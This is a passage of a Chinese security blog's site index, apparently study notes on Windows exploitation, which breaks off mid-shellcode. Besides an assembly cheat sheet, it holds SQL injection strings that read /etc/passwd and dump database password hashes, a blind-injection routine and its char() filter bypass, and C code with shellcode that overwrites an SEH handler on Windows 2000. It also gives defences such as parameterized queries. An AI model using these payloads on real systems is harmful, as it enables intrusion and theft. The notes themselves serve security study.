GS未能完全消灭溢出，但是它使得溢出条件变得异常苛刻。","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"GS","slug":"GS","permalink":"https://www.rgzzplus.com/tags/GS/"}]},{"title":"汇编指令巧记","slug":"汇编指令巧记","date":"2022-05-05T16:10:28.000Z","updated":"2022-08-01T10:30:27.472Z","comments":true,"path":"2022/05/06/汇编指令巧记/","link":"","permalink":"https://www.rgzzplus.com/2022/05/06/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%B7%A7%E8%AE%B0/","excerpt":"","text":"[TOC] 寄存器全称 AH&amp;AL＝AX(accumulator)：累加寄存器 BH&amp;BL＝BX(base)：基址寄存器 CH&amp;CL＝CX(count)：计数寄存器 DH&amp;DL＝DX(data)：数据寄存器 SP（Stack Pointer）：堆栈指针寄存器 BP（Base Pointer）：基址指针寄存器 SI（Source Index）：源变址寄存器 DI（Destination Index）：目的变址寄存器 IP（Instruction Pointer）：指令指针寄存器 CS（Code Segment）代码段寄存器 DS（Data Segment）：数据段寄存器 SS（Stack Segment）：堆栈段寄存器 ES（Extra Segment）：附加段寄存器 OF overflow flag 溢出标志 操作数超出机器能表示的范围表示溢出,溢出时为1. SF sign Flag 符号标志 记录运算结果的符号,结果负时为1. ZF zero flag 零标志 运算结果等于0时为1,否则为0. CF carry flag 进位标志 最高有效位产生进位时为1,否则为0. AF auxiliary carry flag 辅助进位标志 运算时,第3位向第4位产生进位时为1,否则为0. PF parity flag 奇偶标志 运算结果操作数位为1的个数为偶数个时为1,否则为0. DF direcion flag 方向标志 用于串处理.DF=1时,每次操作后使SI和DI减小.DF=0时则增大. IF interrupt flag 中断标志 IF=1时,允许CPU响应可屏蔽中断,否则关闭中断. TF trap flag 陷阱标志 用于调试单步操作. 指令全称 1、通用数据传送指令 MOV—-&gt; move MOVSX—-&gt;extended move with sign data MOVZX—-&gt;extended move with zero data PUSH—-&gt;push POP—-&gt;pop PUSHA—-&gt;push all POPA—-&gt;pop all PUSHAD—-&gt;push all data POPAD—-&gt;pop all data BSWAP—-&gt;byte swap XCHG—-&gt;exchange CMPXCHG—-&gt;compare and change XADD—-&gt;exchange and add XLAT—-&gt;translate 2、输入输出端口传送指令 IN—-&gt;input OUT—-&gt;output 3、目的地址传送指令 LEA—-&gt;load effective address，加载有效的地址 LDS—-&gt;load DS 加载数据段 LES—-&gt;load ES 加载附加段 LFS—-&gt;load FS 加载标记段 LGS—-&gt;load GS 加载全局段 LSS—-&gt;load SS 加载堆栈段 4、标志传送指令 LAHF—-&gt;load AH from flag SAHF—-&gt;save AH to flag PUSHF—-&gt;push flag POPF—-&gt;pop flag PUSHD—-&gt;push dflag POPD—-&gt;pop dflag 二、算术运算指令 ADD—-&gt;add ADC—-&gt;add with carry INC—-&gt;increase 1 AAA—-&gt;ascii add with adjust DAA—-&gt;decimal add with adjust SUB—-&gt;substract SBB—-&gt;substract with borrow DEC—-&gt;decrease 1 NEC—-&gt;negative CMP—-&gt;compare AAS—-&gt;ascii adjust on substract DAS—-&gt;decimal adjust on substract MUL—-&gt;multiplication IMUL—-&gt;integer multiplication AAM—-&gt;ascii adjust on multiplication DIV—-&gt;divide IDIV—-&gt;integer divide AAD—-&gt;ascii adjust on divide CBW—-&gt;change byte to word CWD—-&gt;change word to double word CWDE—-&gt;change word to double word with sign to EAX CDQ—-&gt;change double word to quadrate word 三、逻辑运算指令 AND—-&gt;and OR—-&gt;or XOR—-&gt;xor NOT—-&gt;not TEST—-&gt;test SHL—-&gt;shift left SAL—-&gt;arithmatic shift left SHR—-&gt;shift right SAR—-&gt;arithmatic shift right ROL—-&gt;rotate left ROR—-&gt;rotate right RCL—-&gt;rotate left with carry RCR—-&gt;rotate right with carry 四、串指令 MOVS—-&gt;move string CMPS—-&gt;compare string SCAS—-&gt;scan string LODS—-&gt;load string STOS—-&gt;store string REP—-&gt;repeat REPE—-&gt;repeat when equal REPZ—-&gt;repeat when zero flag REPNE—-&gt;repeat when not equal REPNZ—-&gt;repeat when zero flag REPC—-&gt;repeat when carry flag REPNC—-&gt;repeat when not carry flag 五、程序转移指令 1&gt;无条件转移指令(长转移) JMP—-&gt;jump CALL—-&gt;call RET—-&gt;return RETF—-&gt;return far 2&gt;条件转移指令(短转移,-128到+127的距离内) JAE—-&gt;jump when above or equal JNB—-&gt;jump when not below JB—-&gt;jump when below JNAE—-&gt;jump when not above or equal JBE—-&gt;jump when below or equal JNA—-&gt;jump when not above JG—-&gt;jump when greater JNLE—-&gt;jump when not less or equal JGE—-&gt;jump when greater or equal JNL—-&gt;jump when not less JL—-&gt;jump when less JNGE—-&gt;jump when not greater or equal JLE—-&gt;jump when less or equal JNG—-&gt;jump when not greater JE—-&gt;jump when equal JZ—-&gt;jump when has zero flag JNE—-&gt;jump when not equal JNZ—-&gt;jump when not has zero flag JC—-&gt;jump when has carry flag JNC—-&gt;jump when not has carry flag JNO—-&gt;jump when not has overflow flag JNP—-&gt;jump when not has parity flag JPO—-&gt;jump when parity flag is odd JNS—-&gt;jump when not has sign flag JO—-&gt;jump when has overflow flag JP—-&gt;jump when has parity flag JPE—-&gt;jump when parity flag is even JS—-&gt;jump when has sign flag 3&gt;循环控制指令(短转移) LOOP—-&gt;loop LOOPE—-&gt;loop equal LOOPZ—-&gt;loop zero LOOPNE—-&gt;loop not equal LOOPNZ—-&gt;loop not zero JCXZ—-&gt;jump when CX is zero JECXZ—-&gt;jump when ECX is zero 4&gt;中断指令 INT—-&gt;interrupt INTO—-&gt;overflow interrupt IRET—-&gt;interrupt return 5&gt;处理器控制指令 HLT—-&gt;halt WAIT—-&gt;wait ESC—-&gt;escape LOCK—-&gt;lock NOP—-&gt;no operation STC—-&gt;set carry CLC—-&gt;clear carry CMC—-&gt;carry make change STD—-&gt;set direction CLD—-&gt;clear direction STI—-&gt;set interrupt CLI—-&gt;clear interrupt 六、伪指令 DW—-&gt;definw word PROC—-&gt;procedure ENDP—-&gt;end of procedure SEGMENT—-&gt;segment ASSUME—-&gt;assume ENDS—-&gt;end segment END—-&gt;end","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"汇编指令","slug":"汇编指令","permalink":"https://www.rgzzplus.com/tags/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"}]},{"title":"正则表达式","slug":"正则表达式","date":"2022-05-05T16:09:53.000Z","updated":"2022-05-05T16:14:23.601Z","comments":true,"path":"2022/05/06/正则表达式/","link":"","permalink":"https://www.rgzzplus.com/2022/05/06/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"匹配IP： \\b((25[0-5]|2[0-4]\\d|[01]?\\d\\d?).){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\b","categories":[{"name":"工具","slug":"工具","permalink":"https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://www.rgzzplus.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"其它类型的软件漏洞","slug":"其它类型的软件漏洞","date":"2022-05-05T16:09:34.000Z","updated":"2022-08-01T10:30:57.535Z","comments":true,"path":"2022/05/06/其它类型的软件漏洞/","link":"","permalink":"https://www.rgzzplus.com/2022/05/06/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"[TOC] 格式化漏洞 printf 中的缺陷 printf 的参数：格式控制符和待输出的数据列表 1234567#include &quot;stdio.h&quot;main()&#123; int a=44,b=77; printf(&quot;a=%d,b=%d\\n&quot;,a,b); printf(&quot;a=%d,b=%d\\n&quot;);&#125; 对于上述的代码，第二个 printf 缺少了待输出的数据列表，它运行后会输出什么呢？ 推荐使用的环境 备 注 操作系统 Windows XP SP3 其他 Win32 操作系统也可进行本实验 编译器 Visual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 debug 版本的实验过程将和本实验指导有所差异 说明： 推荐使用 VC 加载程序，在程序关闭前能自动暂停程序以观察输出结果。 输出结果： 第二次 printf 没有引起异常，程序正常执行，只是输出数据有些出乎意料。 用OD调试一下，发现在第一次调用 printf 时，参数按照从左到右的顺序入栈，栈中的状态如下图： 第二次调用 printf 时，由于缺少待输出参数列表，所以只压入格式控制符参数。输出时，系统把格式控制符后面的两个 DWORD 当成了待输出参数列表，自动把十六进制转换成 %d 的有符号整型。 用 printf 读取内存数据 如果 printf 函数参数中的 ”格式控制符“ 可以被外界输入影响，那就是格式化串漏洞了。 12345#include &quot;stdio.h&quot;int main(int argc, char ** argv)&#123; printf(argv[1]);&#125; 实验环境： 推荐使用的环境 备 注 操作系统 Windows XP SP3 其他 Win32 操作系统也可进行本实验 编译器 Visual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 debug 版本的实验过程将和本实验指导有所差异 说明：请使用命令行传入方式加载，并传入适当的参数配合。 打开 cmd 进入程序目录，输入：name.exe %p %p… 通过传入格式控制符，printf 就会打印出栈中的数据。 运行结果： 用 printf 向内存写数据 格式控制符 %n 能把当前输出的所有数据的长度写回到一个变量中去。 12345678#include &quot;stdio.h&quot;int main(int argc, char ** argv)&#123; int len_print=0; printf(&quot;before write: length=%d\\n&quot;,len_print); printf(&quot;failwest:%d%n\\n&quot;,len_print,&amp;len_print); printf(&quot;after write: length=%d\\n&quot;,len_print);&#125; 字符串 “failwest:0” 长度为10，所以第二个 printf 中的 len_print 将会被赋值为 10。 实验环境： 推荐使用的环境 备 注 操作系统 Windows XP SP3 其他 Win32 操作系统也可进行本实验 编译器 Visual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 debug 版本的实验过程将和本实验指导有所差异 说明：推荐使用 VC 加载程序，再程序关闭前能自动暂停程序以观察输出结果。 结果如下图： 格式化串漏洞的检测与防范 当输入输出函数的格式化控制符能够被外界影响时，攻击者可以综合利用前面介绍的读内存和写内存的方法修改函数返回地址，劫持进程，从而使 shellcode 得到执行。 格式化串漏洞的起因非常简单，只要检测相关的函数的参数配置是否恰当就行。通常能引起格式化串漏洞的函数包括： 123456789101112int printf( const char* format [, argument]... );int wprintf( const wchar_t* format [, argument]... );int fprintf( FILE* stream, const char* format [, argument ]...);int fwprintf( FILE* stream, const wchar_t* format [, argument ]...);int sprintf( char *buffer, const char *format [, argument] ... );int swprintf( wchar_t *buffer, const wchar_t *format [, argument] ... );int vprintf( const char *format, va_list argptr );int vwprintf( const wchar_t *format, va_list argptr );int vfprintf( FILE *stream, const char *format, va_list argptr );int vfwprintf( FILE *stream, const wchar_t *format, va_list argptr );int vsprintf( char *buffer, const char *format, va_list argptr );int vswprintf( wchar_t *buffer, const wchar_t *format, va_list argptr ); 通过简单的静态代码扫描，一般可以比较容易地发现这类漏洞。此外， VS2005 中在编译级别对参数做了更好的检查，而且默认情况下关闭了对 “%n” 控制符的使用。 SQL注入攻击（脚本漏洞） SQL 注入原理 SQL 命令注入的漏洞是 Web 系统特有的一类漏洞，它源于 PHP 、ASP等脚本语言对用户输入数据和解析时的缺陷。 SQL 命令注入的精髓是构造巧妙的注入命令串，从服务器不同的反馈结果中，逐步分析出数据库中各个表项之间的关系，直到攻破数据库。 以 PHP 语言为例，如果用户的输入能够影响到脚本中 SQL 命令串的生成，那么很可能在添加了单引号、 #号等转义命令字符后，能够改变数据库最终执行的 SQL 命令。 攻击 PHP + MySQL 网站 首先介绍一下 PHP 配置文件 php.ini 中与注入攻击相关的重要选项，如下表 选 项 安全配置 说 明 safe_mode on 安全模式 display_errors off 是否向客户端返回错误信息。错误信息能够帮助攻击者摸 清数据库的表结构和变量类型等重要信息 magic_quotes_gpc on 自动将提交变量中的单引号、双引号、反斜线等特殊符号 替换为转义字符的形式。例如， ’ 将被转换为 \\’ 在 display_errors 关闭的情况下，攻击者可以利用盲注的方法通过服务器的不同反馈进行分析，获得表结构和列名等信息； 在 magic_quotes_gpc 打开的情况下，攻击者仍然可以通过 MySQL 提供的 char()和 ascii()等函数引用敏感字符。 联合查询（MySQL 4.x及以上的版本） 利用联合查询往往可以直接把得到的数据返回到某个变量中，从而在网页中显示出来。 1234failwest&#x27; union select 1#failwest&#x27; union select 1,2#failwest&#x27; union select 1,2,3#failwest&#x27; union select 1,2,3,4,…# 按照这种方式试探脚本中共有几个变量接收数据。当返回的页面不再出错时，证明变量的数量正好，观察页面中显示出来的数字，可以确定出能够用于显示结果的变量位置。 攻击者常用的注入命令串，如下表。这些攻击串可以跟在 URL 后边，其中 ”failwest“ 代表提交的变量值。 SQL 注入攻击测试用例 说 明 failwest failwest’ and 1=1# failwest’ and 1=2# 判断注入点。第一次是正常请求，如果存在注入漏洞，那 么第二次请求得到结果应该与第一次一样，并且第三次请求得到的结果应该与前两次不同 failwest’ or 1=1# 返回所有数据，常用于有搜索功能的页面 failwest’ union select version()# 返回数据库版本信息 failwest’ union select database()# 返回当前的库名 failwest’ union select user()# 返回数据库的用户名信息 failwest’ union select session_user()# 返回数据库的用户名信息 failwest’ union select system_user()# 返回数据库的用户名信息 failwest’ union select load_file(’/etc/passwd’)# 读取系统文件 failwest’ select user,password from mysql.user# 返回数据库用户的密码信息，密码一般以 MD5 的方式存放 盲注入（MySQL 3.x 版本） 对于 MySQL 3.x 版本，不支持联合查询语言，无法插入整句的检索语言，因此通常采用盲注入：通过服务器对请求的反馈不同，一个字节一个字节地获得数据。 盲注入需要用到以下几个 MySQL 的函数： 1mid( string , offset , len ) 这个 API 用于取出字符串中的一部分。第一个参数是所要操作的字符串，第二个参数指明要截取字符串的偏移位置，第三个参数代表字符串的长度。 当攻击者想获得 etc/hosts 文件的内容时，将先从这个文件的第一个字节开始尝试注入： 1234failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),1,1))=1#failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),1,1))=2#failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),1,1))=3#…… 当尝试的 ASCII 码与/etc/hosts 文件第一个字符的 ASCII 一样的时候， 服务器将返回正常的页面，其余的尝试都将获得错误的页面。由于反馈的不同，最多进行 255 次尝试就能得到/etc/hosts 文件的第一个字节的值。 在获得了第一个字节之后，可以通过 1234failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),2,1))=1#failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),2,1))=2#failwest&#x27;and ascii(mid((load_file(&#x27;/etc/hosts&#x27;),2,1))=3#…… 获得第二个字节、第三个字节……的内容。 这里应该使用折半查找法。 最后，当 php.ini 中的 magic_quotes_gpc 配置选项被打开时，我们不能在攻击串中使用单引号，因为这对字符变量的攻击将不再可行，但如果是数字型变量，则仍然能够实现注入攻击。 对应于上例， load_file(’/etc/hosts’)调用中的单引号和斜杠可以用 MySQL 提供的另一个函数 char() 进行转换，如下表。 char / e t c / H o s t s ASCII 47 101 116 99 47 104 111 115 116 115 failwest'and ascii(mid((load_file('etc/host'),1,1))=1# 可以转换为 failwest’ and ascii(mid((load_file(char(47,101,116,99,47,104,111,115,116,115),1,1))=1# 注入攻击的检测与防范 针对 SQL 注入漏洞的传统防范方式：对用户输入的数据进行限制，过滤掉可能引起攻击的敏感字符。 注意：数据库对大小写不敏感。使用正则表达式，同时过滤掉 select、SELECT、Select、sElect 等所有形式的保留字。 SQL 注入产生的根源：查询语句采用了拼接字符串的形式。 12string sql = “select * from users where user=’” + username + “’ and psw=’” + password + “’”; //username 和 password 两个变量的值是由用户输入的 **有效防范方式：**使用参数化查询的方法。 参数化查询就是在访问数据库时，将查询语句中要填入的数据通过参数的方式传递，这样数据库不会将参数的内容视为 SQL 语句的一部分，因此即便参数中含有攻击者构造的查询指令，也不会被执行。 典型的参数化查询语句： 1234string sql = &quot;select * from users where username=? and password=?&quot;;PreparedStatement pstmt = connection.prepareStatement(sql);pstmt.setString(1,username);pstmt.setString(2,password);//username 和 password 两个变量的值是由用户输入的 防治和检测 SQL 注入漏洞的主要方法： 实时的入侵检测。处理问题的位置位于脚本程序和数据库之间。很有效，但是会对 Web服务器 带来额外的负担 代码分析。如使用数据流分析（ Data FlowAnalysis）、类型验证系统（ Type S ystem）、模型检测系统（ Model C hecking）等查找程序高级逻辑错误的方法来对脚本代码进行漏洞挖掘。 其它注入方式 Cookie 注入，绕过马奇诺防线 程序员们把常用的过滤、编码函数组织成库，最终制作成通用的防注入过滤库。通过防注入库来过滤用户输入的敏感字。然而，防注入系统忽略了用户除了用 Get 和 Post 提交数据外，还能用 Cookie 提交数据。 在动态服务页面（ASP）中，程序员常常使用下面两种语句来获取用户提交的数据： 12ID = Request.QueryString(“id”) //获取用户通过 GET 方式提交的 id 数据ID = Request.Form(“id”) //获取用户通过 POST 方式提交的 id 数据 但为了同时支持 GET 和 POST 方式，常常使用下面这条语句： 1ID = Request(“id”) 这条语句会先读取 GET 中的数据，如果没有再读取 POST 中的数据，如果还没有则会去读取 Cookie 中的数据。很多防注入系统会检测 GET 和 POST 数据中是否存在敏感字符，却忽略了对 Cookie 数据的检测。这样，攻击者就可以利用 Cookie 提交精心构造的注入命令串来进行 SQL 注入。 如何检测一个站点是否存在 Cookie 注入漏洞呢？ 1http://www.testsite.com/news.asp?id=169 我们先输入以下地址来测试该站点是否存在 SQL 注入： 1http://www.testsite.com/news.asp?id=169 and 1=1 如果浏览器跳出请不要在参数中包含非法字符尝试注入对话框或者其它类似提示，则说明该站点使用了敏感字过滤的防注入手段。 如果我们在浏览器中只输入： 1http://www.testsite.com/news.asp?id=16 ------ 未完待续 -------","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"其它类型的漏洞","slug":"其它类型的漏洞","permalink":"https://www.rgzzplus.com/tags/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E/"}]},{"title":"形形色色的内存攻击技术","slug":"形形色色的内存攻击技术","date":"2022-04-23T13:09:12.000Z","updated":"2022-08-01T11:15:51.387Z","comments":true,"path":"2022/04/23/形形色色的内存攻击技术/","link":"","permalink":"https://www.rgzzplus.com/2022/04/23/%E5%BD%A2%E5%BD%A2%E8%89%B2%E8%89%B2%E7%9A%84%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","excerpt":"","text":"[toc] 狙击 Windows 异常处理机制 S.E.H 概述 S.E.H 即异常处理结构体（Structure Exception Handler)，它包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄。 S.E.H 初步了解 S.E.H 链表： **设计思路：**在系统关闭程序前，给程序一个执行预先设定的回调函数的机会 工作原理： （ 1） S.E.H 结构体存放在系统栈中。 （ 2）当线程初始化时，会自动向栈中安装一个 S.E.H，作为线程默认的异常处理。 （ 3）如果程序源代码中使用了__try{}，__except{}或者 Assert 宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个 S.E.H 来实现异常处理。 （ 4）栈中一般会同时存在多个 S.E.H。 （ 5）栈中的多个 S.E.H 通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的 S.E.H 通过 T.E.B（线程环境块） 0 字节偏移处的指针标识。 （ 6）当异常发生时，操作系统会中断程序，并首先从 T.E.B 的 0 字节偏移处取出距离栈顶最近的 S.E.H，使用异常处理函数句柄所指向的代码来处理异常。 （ 7）当离“事故现场”最近的异常处理函数运行失败时，将顺着 S.E.H 链表依次尝试其他的异常处理函数。 （ 8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。 利用思路： （ 1） S.E.H 存放在栈内，故溢出缓冲区的数据有可能淹没 S.E.H。 （ 2）精心制造的溢出数据可以把 S.E.H 中异常处理函数的入口地址更改为 shellcode 的起始地址。 （ 3）溢出后错误的栈帧或堆块数据往往会触发异常。 （ 4）当 Windows 开始处理溢出后的异常时，会错误地把 shellcode 当作异常处理函数而执行。 在栈溢出中利用 S.E.H 实验代码即相关介绍 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;windows.h&gt;#include &lt;stdio.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;;//200 bytes 0x90DWORD MyExceptionhandler(void)&#123; printf(&quot;got an exception, press Enter to kill process!\\n&quot;); getchar(); ExitProcess(1);&#125;void test(char * input)&#123; char buf[200]; int zero=0; __asm int 3 //used to break process for debug __try &#123; strcpy(buf,input); //overrun the stack zero=4/zero; //generate an exception &#125; __except(MyExceptionhandler())&#123;&#125;&#125;main()&#123; test(shellcode);&#125; 代码解释： （ 1）函数 test 中存在典型的栈溢出漏洞，strcpy()函数 （ 2） __try{}会在 test 的函数栈帧中安装一个 S.E.H 结构。 （ 3） __try 中的除零操作会产生一个异常。 （ 4）当 strcpy 操作没有产生溢出时，除零操作的异常将最终被 MyExceptionhandler 函数 处理。 （ 5）当 strcpy 操作产生溢出，并精确地将栈帧中的 S.E.H 异常处理句柄修改为 shellcode 的 入口地址时，操作系统将会错误地使用 shellcode 去处理除零异常，也就是说，代码植入成功。 （ 6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在代码中加入断点_asm int 3，让进程自动中断后再用调试器 attach 的方法进行调试。 **原理：**确定栈帧中 S.E.H 回调句柄的偏移，然后布置缓冲区，淹没这个句柄，将句柄修改为shellcode 的起始位置。 推荐使用的环境 备 注 操作系统 Windows 2000 虚拟机与实体均可 编译器 Visual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 必须使用 release 版本进行调试 说明： Windows XP SP2 和 Windows 2003 中加入了对 S.E.H 的安全校验，因此会导致实验失败。 实验步骤 第一步：确定 shellcode 的起始位置 和 S.E.H 回调句柄的偏移 暂时将 shellcode 赋值为一段 0x90，运行代码，如下图所示，shellcode 的起始地址为0x0012fe48 查看所有的 S.E.H 结构的位置和其注册的异常回调函数句柄，依次点击OllyDbg菜单中的 “查看” —&gt; “SEH链” 上图显示当前线程安装了 3 个S.E.H，当发生异常时，位于0x0012ff68处的 S.E.H 将第一个被调用 0x0012ff1c处的指针0x004017f8是我们需要修改的异常回调函数句柄。 第二步：组织缓冲区，把0x0012ff1c处的回调句柄修改成 shellcode 的起始地址 0x0012fe48 缓冲区起始地址 0x0012fe48与异常句柄 0x0012ff1c之间共有 212 个字节的间隙。 仍然用弹出 “failwest” 消息框的 shellcode 进行测试，将不足 212 字节的部分用 0x90补齐。缓冲区最后的 4 个字节，即 209~212字节使用 shellcode 的起始地址0x0012fe48填充，来覆盖异常回调函数的句柄；最后删去中断指令__asm int 3 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;windows.h&gt;#include &lt;stdio.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x48\\xFE\\x12\\x00&quot;;DWORD MyExceptionhandler(void)&#123; printf(&quot;got an exception, press Enter to kill process!\\n&quot;); getchar(); ExitProcess(1);&#125;void test(char * input)&#123; char buf[200]; int zero=0; _try &#123; strcpy(buf,input); //overrun the stack zero=4/zero; //generate an exception &#125; _except(MyExceptionhandler())&#123;&#125;&#125;main()&#123; test(shellcode);&#125; 运行一下代码，弹出了 “failwest” 消息框，如下图，栈溢出成功 这时操作系统错误的使用 shellcode 去处理除零异常，从而使植入代码运行。 在堆溢出中利用 S.E.H 堆溢出发生往往同时伴随着异常产生，所以 S.E.H 通常也是堆溢出 DWORD SHOOT 的目标。 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x